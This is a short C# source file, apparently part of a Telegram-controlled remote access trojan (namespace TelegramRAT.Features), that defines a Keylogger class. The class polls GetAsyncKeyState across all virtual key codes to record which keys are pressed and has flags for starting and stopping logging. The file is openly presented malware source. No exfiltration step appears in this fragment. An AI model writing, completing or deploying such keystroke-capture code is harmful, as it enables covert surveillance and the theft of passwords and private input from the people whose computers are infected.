using TelegramRAT.Utilities;

namespace TelegramRAT.Features;

static class Keylogger
{
    public static bool IsLogging { get; private set; } = false;

    public static List<uint> GetPressingKeys()
    {
        List<uint> keys = new List<uint>();

        for (uint i = 0; i < 256; i++)
        {
            int state = WinAPI.GetAsyncKeyState(i);
            if (state != 0)
            {
                keys.Add(i);
            }
        }

        return keys;
    }

    public static void StartLogging()
    {
        if (IsLogging)
            throw new Exception("Keylogger was already started!");
        IsLogging = true;
    }

    public static void StopLogging()
    {
        if (!IsLogging)
            throw new Exception("Keylogger wasn't started yet!");
        IsLogging = false;
    }

}
